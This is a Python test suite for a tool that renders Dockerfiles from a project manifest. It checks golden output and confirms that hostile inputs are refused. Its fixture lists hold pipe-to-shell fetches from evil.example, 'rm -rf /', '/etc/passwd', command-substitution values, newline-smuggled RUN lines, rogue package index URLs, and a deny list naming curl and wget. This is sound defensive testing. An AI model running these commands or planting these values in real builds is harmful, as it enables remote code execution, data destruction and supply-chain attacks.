"""R10: `capsule image render` (capsule/image_render.py), the judge that turns `capsule.toml
[image]` into the project layer's Dockerfile. It runs no docker and no network: checks read text.
Oracle 1: the rendered Dockerfile compared byte-for-byte with a hand-checked golden under
fixtures/image_render (its lock holds a real wheel hash). Oracle 2: parsers written here from the
Debian package-name policy and the pinned-and-hashed requirement shape, not from the renderer's
patterns: one over the rendered text (fixed instructions and RUN commands only), one over lock
text that the renderer's accept or refuse answer must agree with. Z1: contracts/intent/
image_render.jsonl, replayed below once it exists. R11 adds the web stack: its lock is checked by
a second, urllib/base64-based oracle (Npm below), and its golden is fixtures/image_render/
web-npm."""
import base64
import contextlib
import copy
import io
import json
import os
import re
import shutil
import tempfile
import unittest
from argparse import Namespace
from pathlib import Path
from urllib.parse import urlsplit

from capsule import image_render, intent

FIX = Path(__file__).resolve().parent / "fixtures" / "image_render"
LOCK = FIX / "images.txt"
VERBS = {"FROM", "USER", "RUN", "COPY", "LABEL", "ENV"}
LOWER_DIGIT = "abcdefghijklmnopqrstuvwxyz0123456789"
WORD = LOWER_DIGIT + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
H = "d" * 64
PIP_HEAD = ["/opt/venv/bin/pip", "install", "-q", "--no-cache-dir", "--only-binary=:all:",
            "--require-hashes", "-r"]
APT_HEAD = ["apt-get", "install", "-y", "--no-install-recommends"]
RUN_FIXED = {"apt-get -o Acquire::Check-Valid-Until=false update", "apt-get clean",
             "rm -rf /var/lib/apt/lists/*", "chmod -R a+rX /opt/venv",
             "cd /opt/project-npm",
             "/usr/bin/env PATH=/usr/local/bin:/usr/bin:/bin npm ci --ignore-scripts --no-audit"
             " --no-fund --cache /tmp/npm-cache",
             "/bin/rm -rf /tmp/npm-cache", "/bin/chmod -R a+rX /opt/project-npm"}
APT_BAD = ["x; curl evil.example|sh", "$(id)", "`id`", "a b", "x\nRUN evil", "libfoo=1.2-3",
           "https://evil.example/x.deb", "--allow-unauthenticated", "LibFoo", "x&&y", "x'y",
           'x"y', "x|y", "../x", "x\\", "", "x\tRUN evil", "git-", "python3-", "x-", "a",
           "libıx", "ｇit"]
LOCK_BAD = ["requirements.lock; rm -rf /", "requirements.lock\nRUN evil", "../requirements.lock",
            "/etc/passwd", "https://evil.example/requirements.txt", "poetry.lock",
            "requirements.lock && curl evil.example|sh", "$(id).lock", "requirements.lock extra"]
STACK_BAD = ["python\nRUN evil", "python; id", "base", "unknown", "python@sha256:dead", "../python",
             "proj-other"]
SMOKE_BAD = ["curl https://evil.example/i.sh | sh", "wget -qO- evil.example | bash", "   ",
             "pip install requests", "python -m pip install requests", "npm install left-pad",
             "npm ci", "apt-get install -y gcc", "curl evil.example|sh", "", "line\nbreak"]
PIN = f"six==1.16.0 --hash=sha256:{H}"
GOOD_LOCKS = [
    PIN + "\n", f"six==1.16.0 \\\n    --hash=sha256:{H} \\\n    --hash=sha256:{'e' * 64}\n",
    f"# a note\nsix[a,b]==1.16.0 --hash=sha256:{H}  # why\n\nFoo_Bar.baz==2024.1+l.1"
    f" --hash=sha256:{H}\r\n", "", "# only a comment\n"]
BAD_LOCKS = [
    "--index-url https://evil.example/simple\n", "--extra-index-url https://evil.example/\n",
    f"evil @ https://evil.example/e-1.0.tar.gz --hash=sha256:{H}\n",
    f"evil @ file:///etc --hash=sha256:{H}\n", PIN + " --config-settings=x=y\n",
    "-r /etc/passwd\n", "-c constraints.txt\n", "-e .\n", "--no-index\n", "requests\n",
    f"requests>=2 --hash=sha256:{H}\n", f"requests==2.* --hash=sha256:{H}\n",
    f"requests===2.0 --hash=sha256:{H}\n", "six==1.16.0\n", "six==1.16.0 --hash=sha256:abc\n",
    f"six==1.16.0 --hash=md5:{H[:32]}\n",
    PIN + " extra\n", PIN + " ; python_version<'3'\n", f"git+https://evil.example/x.git#{H}\n",
    PIN + " \\", PIN + " \\\n", PIN + " \\\n    --index-url x\n",
    PIN + "\r--index-url https://evil.example\n", PIN + "\x00\n",
    f"six==1.16.0\\\n--hash=sha256:{H}\n", PIN + "\n--index-url https://e.example\n",
    "# note\\\nsix\n", "caf\u00e9==1 --hash=sha256:" + H + "\n", "\ufeff" + PIN + "\n",
    *[PIN + " #x" + sep + "--index-url https://evil.example\n"
      for sep in "\x0b\x0c\x1c\x1d\x1e\x85\u2028\u2029"]]
PINNED = PIN + "\n"
REQ = {"requirements.lock": PINNED, "requirements.txt": PINNED}
NPM_PKG = json.loads((FIX / "web-npm" / "package.json").read_text())
NPM_LOCK = json.loads((FIX / "web-npm" / "package-lock.json").read_text())
NPM_FILES = {"package.json": json.dumps(NPM_PKG), "package-lock.json": json.dumps(NPM_LOCK)}
FLOATING = ["^7.0.0", "~7.0.0", "*", "latest", ">=7", "7.x", "7", "", "7.0.0 - 8.0.0", "next",
            "git+https://evil.example/x.git", "github:evil/x", "file:../x", "link:../x",
            "https://evil.example/x.tgz", "npm:other@7.0.0", "workspace:*", "7.0.0 || 8.0.0"]


def floating_files():
    return {"package.json": json.dumps({"dependencies": {"is-number": "^7.0.0"}}),
            "package-lock.json": json.dumps(NPM_LOCK)}


def npm_entry_ok(entry):
    """Oracle 2 for one lock entry, from urllib and base64 rather than the renderer's patterns."""
    try:
        url = urlsplit(entry["resolved"])
        scheme, digest = entry["integrity"].split("-", 1)
        raw = base64.b64decode(digest, validate=True)
        parts = entry["version"].split("-")[0].split(".")
    except (KeyError, ValueError, AttributeError):
        return False
    return (url.scheme == "https" and url.hostname == "registry.npmjs.org"
            and url.port is None and not url.username and not url.query and not url.fragment
            and ".." not in url.path.split("/")[1:] and url.path.endswith(".tgz")
            and scheme == "sha512" and len(raw) == 64
            and len(parts) == 3 and all(p.isdigit() for p in parts) and not entry.get("link"))


def debian_name(name):
    """Debian policy 5.6.1: two characters or more, lowercase alphanumeric first, then lowercase
    alphanumerics and `+ - .`; `apt-get install x-` would remove x, so never a trailing `-`."""
    return (len(name) >= 2 and name[0] in LOWER_DIGIT and not name.endswith("-")
            and all(c in LOWER_DIGIT + "+-." for c in name))


def pinned_hashed(entry):
    """`name[extras]==version` then one or more `--hash=sha256:<64 hex>`, nothing else."""
    first, *hashes = entry.split()
    name, eq, version = first.partition("==")
    base, bracket, extras = name.partition("[")
    extras_ok = not bracket or (extras.endswith("]") and extras != "]"
                                and all(c in WORD + "._,-" for c in extras[:-1]))
    return bool(eq and hashes and extras_ok and base[:1] in WORD and version[:1] in WORD
                and all(c in WORD + "._-" for c in base)
                and all(c in WORD + "._+!-" for c in version)
                and all(h.startswith("--hash=sha256:") and len(h) == 14 + 64
                        and set(h[14:]) <= set("0123456789abcdef") for h in hashes))


def lock_ok(text):
    """Every logical line of a requirements file is a pinned, hashed requirement, and the text
    has no character pip could split a line on beyond tab, CR and LF."""
    if not all(c in "\t\n\r" or " " <= c <= "~" for c in text):
        return False
    pending = ""
    for raw in text.splitlines():
        code = "" if raw.lstrip().startswith("#") else raw.split(" #")[0]
        if code.endswith("\\"):
            pending += code[:-1]
            continue
        entry, pending = (pending + code).strip(), ""
        if entry and not pinned_hashed(entry):
            return False
    return pending == ""


def run_ok(cmd):
    words = cmd.split(" ")
    if cmd in RUN_FIXED:
        return True
    if words[:4] == APT_HEAD:
        return len(words) > 4 and all(debian_name(w) for w in words[4:])
    if words[:7] == PIP_HEAD and len(words) == 8:
        folder, _, leaf = words[7].rpartition("/")
        return (folder == "/tmp/locks" and leaf.startswith("requirements")
                and leaf.endswith((".lock", ".txt")) and all(c in WORD + "._-" for c in leaf))
    return False


def toml(**image):
    return "[image]\n" + "".join(f"{k} = {json.dumps(v)}\n" for k, v in image.items())


def instructions(text):
    """The Dockerfile's instructions with continuation lines joined, comments and blanks dropped."""
    return [" ".join(ln.split()) for ln in re.sub(r"\\\n", " ", text).splitlines()
            if ln.strip() and not ln.startswith("#")]


class Base(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp())
        self.aux = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.dir, True)
        self.addCleanup(shutil.rmtree, self.aux, True)

    def project(self, manifest, files=None):
        shutil.rmtree(self.dir)
        self.dir.mkdir()
        (self.dir / "capsule.toml").write_text(manifest)
        for name, body in (files or {}).items():
            (self.dir / name).write_text(body)
        return self.dir

    def render(self, project, output=None, lock=LOCK):
        out, err = io.StringIO(), io.StringIO()
        args = Namespace(project=str(project), lock=str(lock), output=output)
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = image_render.main(args)
        return rc, out.getvalue(), err.getvalue()

    def lock_text(self, text):
        path = self.aux / "IMAGES.lock"
        path.write_text(text)
        return path

    def check_text(self, text):
        """Oracle 2: only these instructions, only these RUN commands, no shell tricks."""
        for line in instructions(text):
            verb, _, rest = line.partition(" ")
            self.assertIn(verb, VERBS, line)
            for cmd in rest.split(" && ") if verb == "RUN" else []:
                self.assertTrue(run_ok(cmd), f"RUN not allowed: {cmd!r}")
        code = "\n".join(instructions(text))      # the header comment may quote backticks
        for bad in ("|", ";", "$", "`", "://", "curl", "wget", "--index-url", "--registry"):
            self.assertNotIn(bad, code)
        self.assertNotRegex(code, r"pip install(?!.*--only-binary=:all: --require-hashes)")
        self.assertNotRegex(code, r"(?<![-\w/])npm\s+(?!ci --ignore-scripts --no-audit --no-fund)")


class Golden(Base):
    def test_a_python_manifest_renders_the_golden_byte_for_byte(self):
        rc, out, err = self.render(FIX / "pip-apt")
        self.assertEqual((rc, err), (0, ""))
        self.assertEqual(out, (FIX / "pip-apt" / "expected.Dockerfile").read_text())
        self.check_text(out)
        self.assertTrue(lock_ok((FIX / "pip-apt" / "requirements.txt").read_text()))

    def test_unusual_but_valid_package_names_still_pass_the_parser(self):
        names = ["g++", "libstdc++-14-dev", "python3.13-dev", "x+", "7zip", "a1"]
        rc, out, _ = self.render(self.project(toml(stacks=["python"], apt=names)))
        self.assertEqual(rc, 0)
        self.assertTrue(all(debian_name(n) for n in names))
        self.check_text(out)

    def test_smoke_lines_never_reach_the_dockerfile(self):
        p = self.project(toml(stacks=["python"], smoke=["python -c 'print(1)'"]))
        rc, out, _ = self.render(p)
        self.assertEqual(rc, 0)
        self.assertNotIn("print", out)

    def test_output_flag_writes_the_file_and_stdout_stays_empty(self):
        target = self.dir / "out.Dockerfile"
        rc, out, _ = self.render(FIX / "pip-apt", output=str(target))
        self.assertEqual((rc, out), (0, ""))
        self.assertEqual(target.read_text(), (FIX / "pip-apt" / "expected.Dockerfile").read_text())


class Refused(Base):
    def refused(self, manifest, files=None, lock=LOCK):
        rc, out, err = self.render(self.project(manifest, files), lock=lock)
        self.assertEqual((rc, out), (1, ""), manifest)
        self.assertIn("refused", err)
        return err

    def test_an_unknown_key_is_refused_by_name(self):
        for key in ("pip", "run", "env", "base", "version", "npm"):
            self.assertIn(repr(key), self.refused(toml(stacks=["python"], **{key: ["x"]})))

    def test_injection_through_apt_names_is_refused_and_the_oracle_agrees(self):
        for bad in APT_BAD:
            self.assertFalse(debian_name(bad), bad)
            self.refused(toml(stacks=["python"], apt=["libpq-dev", bad]))

    def test_injection_through_lockfile_names_is_refused(self):
        for bad in LOCK_BAD:
            self.refused(toml(stacks=["python"], lockfiles=[bad]), REQ)

    def test_injection_through_stack_names_is_refused(self):
        for bad in STACK_BAD:
            self.refused(toml(stacks=[bad]))

    def test_a_stack_list_that_is_not_exactly_one_stack_is_refused(self):
        for manifest in (toml(stacks=["python", "web"]), toml(stacks=[]), toml(apt=["x1"])):
            self.refused(manifest)

    def test_smoke_that_fetches_installs_or_pipes_to_a_shell_is_refused(self):
        for bad in SMOKE_BAD:
            self.refused(toml(stacks=["python"], smoke=["python -V", bad]))

    def test_an_empty_or_unprintable_smoke_line_is_not_called_a_fetch(self):
        for bad in ("", "  ", "a\x00b", "line\nbreak"):
            err = self.refused(toml(stacks=["python"], smoke=[bad]))
            self.assertIn("empty or has an unprintable", err)
            self.assertNotIn("fetches", err)
        err = self.refused(toml(stacks=["python"], smoke=["pip install x"]))
        self.assertIn("fetches, installs or pipes to a shell", err)

    def test_a_lockfile_that_is_missing_or_listed_twice_is_refused(self):
        self.refused(toml(stacks=["python"], lockfiles=["requirements.lock"]))
        self.refused(toml(stacks=["python"], lockfiles=["requirements.lock", "requirements.lock"]),
                     REQ)

    def test_each_lock_kind_needs_its_own_stack(self):
        err = self.refused(toml(stacks=["python"], lockfiles=["package-lock.json"]), NPM_FILES)
        self.assertIn("needs the web stack", err)
        err = self.refused(toml(stacks=["web"], lockfiles=["requirements.lock"]), REQ)
        self.assertIn("needs the python stack", err)
        err = self.refused(toml(stacks=["web"], lockfiles=["package.json"]), NPM_FILES)
        self.assertIn("is not a lockfile", err)

    def test_a_lockfile_that_is_a_symlink_is_refused(self):
        target = self.aux / "real.txt"
        target.write_text(PINNED)
        p = self.project(toml(stacks=["python"], lockfiles=["requirements.lock"]))
        os.symlink(target, p / "requirements.lock")
        rc, out, err = self.render(p)
        self.assertEqual((rc, out), (1, ""))
        self.assertIn("symlink", err)

    def test_a_lockfile_that_is_not_text_is_refused_not_crashed(self):
        p = self.project(toml(stacks=["python"], lockfiles=["requirements.lock"]))
        (p / "requirements.lock").write_bytes(b"\xff\xfe\x00six==1\n")
        rc, out, err = self.render(p)
        self.assertEqual((rc, out), (1, ""))
        self.assertIn("requirements.lock", err)

    def test_wrong_types_are_refused_not_crashed(self):
        self.refused("[image]\nstacks = \"python\"\n")
        self.refused(toml(stacks=["python"], apt=[1]))
        self.refused(toml(stacks=["python"], smoke="python -V"))

    def test_every_problem_is_listed_not_just_the_first(self):
        err = self.refused(toml(stacks=["python"], apt=["x;y"], smoke=["pip install z"], extra=[]))
        self.assertEqual(len(err.splitlines()), 3)


class LockContents(Base):
    """The lock's own lines: the renderer's answer must match the independent oracle."""

    def answer(self, body):
        p = self.project(toml(stacks=["python"], lockfiles=["requirements.lock"]),
                         {"requirements.lock": body})
        return self.render(p)

    def test_a_lock_is_rendered_exactly_when_every_line_is_pinned_and_hashed(self):
        for body in GOOD_LOCKS:
            self.assertTrue(lock_ok(body), repr(body))
            rc, out, err = self.answer(body)
            self.assertEqual((rc, err), (0, ""), repr(body))
            self.check_text(out)
        for body in BAD_LOCKS:
            self.assertFalse(lock_ok(body), repr(body))
            rc, out, err = self.answer(body)
            self.assertEqual((rc, out), (1, ""), repr(body))
            self.assertRegex(err, r"requirements.lock line \d+ (is not a pinned|has a control)")

    def test_the_refusal_names_the_file_and_the_line(self):
        for sep in "\x0b\x0c\x1c\x85\u2028":     # a break only pip sees, inside a comment
            err = self.answer(f"# top\n{PIN} #x{sep}--index-url https://evil.example\n")[2]
            self.assertIn("requirements.lock line 2 has a control or non-ASCII character", err)
        err = self.answer(f"# top\n{PIN}\n\n--index-url https://evil.example/\n")[2]
        self.assertIn("lockfiles: requirements.lock line 4 is not a pinned, hashed requirement",
                      err)


class Npm(Base):
    """R11: the web stack's lock. Every refusal the python lock has has a twin here: a floating
    or URL spec in package.json, and a lock entry that is not an exact registry.npmjs.org
    tarball with a sha512 hash. The renderer's answer must agree with npm_entry_ok."""
    ENTRY = "node_modules/is-number"

    def answer(self, pkg=None, lock=None, stack="web"):
        files = {"package.json": json.dumps(NPM_PKG if pkg is None else pkg),
                 "package-lock.json": json.dumps(NPM_LOCK if lock is None else lock)}
        manifest = toml(stacks=[stack], lockfiles=["package-lock.json"])
        return self.render(self.project(manifest, files))

    def lock_with(self, **fields):
        lock = copy.deepcopy(NPM_LOCK)
        lock["packages"][self.ENTRY].update(fields)
        return lock

    def test_the_web_golden_renders_byte_for_byte_and_its_lock_passes_the_oracle(self):
        rc, out, err = self.render(FIX / "web-npm")
        self.assertEqual((rc, err), (0, ""))
        self.assertEqual(out, (FIX / "web-npm" / "expected.Dockerfile").read_text())
        self.check_text(out)
        self.assertTrue(npm_entry_ok(NPM_LOCK["packages"][self.ENTRY]))
        self.assertIn("npm ci --ignore-scripts", out)

    def test_the_npm_run_line_uses_absolute_tools_and_a_clean_path(self):
        """A registry package may ship a bin named rm or chmod; the root RUN line after `npm ci`
        must not resolve any command through node_modules/.bin (R11 review blocker)."""
        out = self.render(FIX / "web-npm")[1]
        run = [ln for ln in instructions(out) if "npm ci" in ln]
        self.assertEqual(len(run), 1)
        words = run[0].split(" ")
        self.assertIn("/usr/bin/env PATH=/usr/local/bin:/usr/bin:/bin npm ci", run[0])
        self.assertNotIn("node_modules", run[0].split("PATH=")[1].split(" npm ")[0])
        for tool in ("rm", "chmod"):
            self.assertIn(f"/bin/{tool}", words)
            self.assertNotIn(tool, words)

    def test_an_exact_version_is_accepted_in_every_dependency_section(self):
        for section in ("dependencies", "devDependencies", "optionalDependencies"):
            for spec in ("7.0.0", "1.2.3-beta.1"):
                pkg = {**NPM_PKG, section: {"is-number": spec}}
                self.assertEqual(self.answer(pkg)[0], 0, (section, spec))

    def test_a_floating_or_url_spec_is_refused_in_every_dependency_section(self):
        for section in ("dependencies", "devDependencies", "optionalDependencies"):
            for spec in FLOATING:
                rc, out, err = self.answer({**NPM_PKG, section: {"is-number": spec}})
                self.assertEqual((rc, out), (1, ""), (section, spec))
                self.assertIn(f"{section} 'is-number' is not an exact version", err)
        for odd in (["is-number"], "7.0.0", {"is-number": 7}, {"is-number": None}):
            self.assertEqual(self.answer({**NPM_PKG, "dependencies": odd})[0], 1, odd)

    def test_a_lock_entry_that_is_not_an_exact_registry_tarball_is_refused(self):
        host = "https://registry.npmjs.org"
        bad = [{"resolved": "http://registry.npmjs.org/is-number/-/is-number-7.0.0.tgz"},
               {"resolved": "https://registry.npmjs.org.evil.example/x.tgz"},
               {"resolved": f"{host}@evil.example/x.tgz"},
               {"resolved": "https://evil.example/is-number-7.0.0.tgz"},
               {"resolved": f"{host}/is-number/-/is-number-7.0.0.tgz?x=1"},
               {"resolved": f"{host}/is-number/-/is-number-7.0.0.tgz#frag"},
               {"resolved": "git+ssh://git@github.com/evil/x.git#abc"},
               {"resolved": f"{host}/../x/-/x-7.0.0.tgz"},
               {"resolved": "file:../x"}, {"resolved": ""}, {"resolved": None},
               {"integrity": "sha1-" + "A" * 27 + "="},
               {"integrity": "sha512-not base64!"}, {"integrity": "sha512-QUJD"},
               {"integrity": ""}, {"version": "^7.0.0"}, {"version": "latest"},
               {"version": "7.0.0", "link": True}]
        for fields in bad:
            entry = {**NPM_LOCK["packages"][self.ENTRY], **fields}
            self.assertFalse(npm_entry_ok(entry), fields)
            rc, out, err = self.answer(lock=self.lock_with(**fields))
            self.assertEqual((rc, out), (1, ""), fields)
            self.assertIn(f"entry {self.ENTRY!r} is not an exact version", err)
        for missing in ("resolved", "integrity", "version"):
            lock = copy.deepcopy(NPM_LOCK)
            del lock["packages"][self.ENTRY][missing]
            self.assertFalse(npm_entry_ok(lock["packages"][self.ENTRY]), missing)
            self.assertEqual(self.answer(lock=lock)[0], 1, missing)

    def test_a_second_bad_entry_is_found_after_good_ones(self):
        lock = copy.deepcopy(NPM_LOCK)
        lock["packages"]["node_modules/evil"] = {"version": "1.0.0", "resolved": "file:../e"}
        err = self.answer(lock=lock)[2]
        self.assertIn("entry 'node_modules/evil'", err)
        self.assertNotIn("is-number", err)

    def test_a_lock_that_is_not_version_3_with_packages_is_refused(self):
        legacy = {**NPM_LOCK, "dependencies": {"x": {"version": "git+https://evil.example/x"}}}
        for lock in ({"lockfileVersion": 1, "dependencies": {}}, {"lockfileVersion": 3},
                     {"lockfileVersion": 2, "packages": NPM_LOCK["packages"]},
                     {"lockfileVersion": 3, "packages": []}, legacy, [], {}):
            err = self.answer(lock=lock)[2]
            self.assertIn("needs lockfileVersion 3 with packages and no legacy dependencies", err)

    def test_only_nested_node_modules_keys_are_allowed(self):
        entry = NPM_LOCK["packages"][self.ENTRY]
        good = ["node_modules/a", "node_modules/@scope/pkg", "node_modules/a/node_modules/b"]
        bad = ["../../usr/bin/x", "/etc/x", "node_modules/../x", "node_modules/..", "pkgs/a",
               "node_modules/a/../../x", "node_modules/.bin", "node_modules/a/", "x"]
        for key in good:
            lock = copy.deepcopy(NPM_LOCK)
            lock["packages"][key] = entry
            self.assertEqual(self.answer(lock=lock)[0], 0, key)
        for key in bad:
            lock = copy.deepcopy(NPM_LOCK)
            lock["packages"][key] = entry
            rc, out, err = self.answer(lock=lock)
            self.assertEqual((rc, out), (1, ""), key)
            self.assertIn(f"key {key!r} is not a node_modules/ package path", err)

    def test_missing_symlinked_or_unreadable_files_are_refused_not_crashed(self):
        for name in NPM_FILES:
            p = self.project(toml(stacks=["web"], lockfiles=["package-lock.json"]), NPM_FILES)
            (p / name).unlink()
            self.assertIn("is not a plain file", self.render(p)[2])
            target = self.aux / "real.json"
            target.write_text(NPM_FILES[name])
            os.symlink(target, p / name)
            self.assertIn("symlink", self.render(p)[2])
            (p / name).unlink()
            (p / name).write_bytes(b"\xff\xfe{")
            rc, out, err = self.render(p)
            self.assertEqual((rc, out), (1, ""))
            self.assertIn(f"{name} cannot be read as JSON", err)

    def test_the_lock_must_be_listed_once_and_package_json_is_not_a_lockfile(self):
        files = NPM_FILES
        both = toml(stacks=["web"], lockfiles=["package-lock.json", "package-lock.json"])
        self.assertIn("listed twice", self.refused_text(both, files))
        self.assertIn("is not a lockfile", self.refused_text(
            toml(stacks=["web"], lockfiles=["package.json"]), files))

    def refused_text(self, manifest, files):
        rc, out, err = self.render(self.project(manifest, files))
        self.assertEqual((rc, out), (1, ""))
        return err


class ImagesLock(Base):
    PY = "capsule-python@sha256:" + "b" * 64

    def stack_render(self, lock_body, stack="python"):
        lock = self.lock_text(lock_body)
        return self.render(self.project(toml(stacks=[stack])), lock=lock)

    def test_a_commented_digest_is_ignored_even_when_it_comes_last(self):
        old = "capsule-python@sha256:" + "9" * 64
        rc, out, _ = self.stack_render(f"{self.PY}\n# rollback was {old}\n# {old}\n")
        self.assertEqual(rc, 0)
        self.assertIn("b" * 64, out)
        self.assertNotIn("9" * 64, out)
        rc, out, err = self.stack_render(f"# {old}\nnote {old} here\ncapsule-python:local\n")
        self.assertEqual((rc, out), (1, ""))
        self.assertIn("capsule-python row", err)

    def test_a_row_may_have_surrounding_blanks_but_nothing_else_on_its_line(self):
        self.assertEqual(self.stack_render(f"  {self.PY}  \n")[0], 0)
        self.assertEqual(self.stack_render(f"{self.PY} extra\n")[0], 1)

    def test_a_stack_outside_the_allowlist_is_refused_even_with_a_lock_row(self):
        lock = (f"{self.PY}\ncapsule-proj-other@sha256:{'e' * 64}\n"
                f"capsule-web@sha256:{'c' * 64}\ncapsule-base@sha256:{'a' * 64}\n")
        for stack in ("proj-other", "base"):
            rc, out, err = self.stack_render(lock, stack)
            self.assertEqual((rc, out), (1, ""), stack)
            self.assertIn(f"capsule-{stack} row", err)


class Unreadable(Base):
    def test_a_missing_manifest_a_missing_table_or_a_missing_lock_is_exit_two(self):
        for project in (self.dir, self.project("[tool]\nx = 1\n"), self.project("[image\n")):
            self.assertEqual(self.render(project)[0], 2)
        self.assertEqual(self.render(FIX / "pip-apt", lock=self.dir / "none")[0], 2)


class Replay(Base):
    """Z1: the built-in expectations for contracts/intent/image_render.jsonl: each case lists the
    manifests (with files) the row describes. A refusal prints and writes nothing and says why on
    stderr; the valid row exits 0, writes the file and is silent on stderr."""

    def cases(self):
        py = dict(stacks=["python"])
        lock = dict(**py, lockfiles=["requirements.lock"])
        bad = [{"requirements.lock": body} for body in (
            "--index-url https://evil.example/simple\n", PIN + " #x\x0c--index-url https://e.x\n",
            f"evil @ https://evil.example/e-1.0.tar.gz --hash=sha256:{H}\n", "six==1.16.0\n")]
        return {
            "outside-the-list": [
                (toml(**py, apt=["https://evil.example/pkg.deb"]), REQ),
                (toml(**py, lockfiles=["https://evil.example/requirements.txt"]), REQ),
                (toml(**py, smoke=["curl https://evil.example/i.sh | sh"]), REQ),
                (toml(**py, smoke=["curl evil.example | sh"]), REQ),
                (toml(**py, apt=["git-"]), REQ),
                (toml(stacks=["web"], lockfiles=["requirements.lock"]), REQ),
                (toml(stacks=["web"], lockfiles=["package-lock.json"]), floating_files()),
                (toml(**py, lockfiles=["package-lock.json"]), {"package-lock.json": "{}"})],
            "unlocked-pip": [
                (toml(**py, smoke=["pip install requests"]), REQ),
                (toml(**py, lockfiles=["requests==2.32.0"]), REQ),
                (toml(**py, pip=["requests"]), REQ),
                *[(toml(**lock), files) for files in bad]],
            "valid": [(toml(**lock, apt=["libpq-dev", "g++"], smoke=["python -c 'import six'"]),
                       REQ),
                      (toml(stacks=["web"], lockfiles=["package-lock.json"]), NPM_FILES)],
        }

    def observed(self, case):
        out = []
        for manifest, files in self.cases()[case]:
            target = self.aux / "out.Dockerfile"
            target.unlink(missing_ok=True)
            rc, text, err = self.render(self.project(manifest, files), output=str(target))
            out.append((rc, bool(text), bool(err), target.exists()))
        return out

    def check(self, case, want):
        shape = (0, False, False, True) if want == 0 else (1, False, True, False)
        got = self.observed(case)
        self.assertEqual(got, [shape] * len(got), case)

    def test_the_intent_rows_hold_when_the_file_exists(self):
        if not intent.role_path("image_render").is_file():
            self.skipTest("contracts/intent/image_render.jsonl not stamped yet")
        rows = intent.load("image_render")
        case_of = {"outside-the-list-refused": "outside-the-list",
                   "unlocked-pip-refused": "unlocked-pip", "valid-renders": "valid"}
        self.assertEqual({r["id"] for r in rows}, set(case_of))
        for ex in rows:
            self.check(case_of[ex["id"]], ex["expect"]["exit"])

    def test_the_built_in_cases_hold_without_the_file(self):
        for case, want in (("outside-the-list", 1), ("unlocked-pip", 1), ("valid", 0)):
            self.check(case, want)


if __name__ == "__main__":
    unittest.main()
